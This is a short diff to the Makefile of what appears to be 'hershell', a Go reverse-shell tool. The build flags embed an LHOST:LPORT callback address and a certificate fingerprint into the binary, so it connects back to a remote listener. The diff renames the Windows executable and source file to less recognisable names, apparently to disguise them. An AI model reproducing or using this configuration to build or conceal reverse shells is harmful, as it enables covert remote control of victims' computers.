@@ -1,7 +1,7 @@
 BUILD=go build
 OUT_LINUX=hershell
-OUT_WINDOWS=hershell.exe
-SRC=hershell.go
+OUT_WINDOWS=goatmoe.exe
+SRC=hrshl.go
 SRV_KEY=server.key
 SRV_PEM=server.pem
 LINUX_LDFLAGS=--ldflags "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"
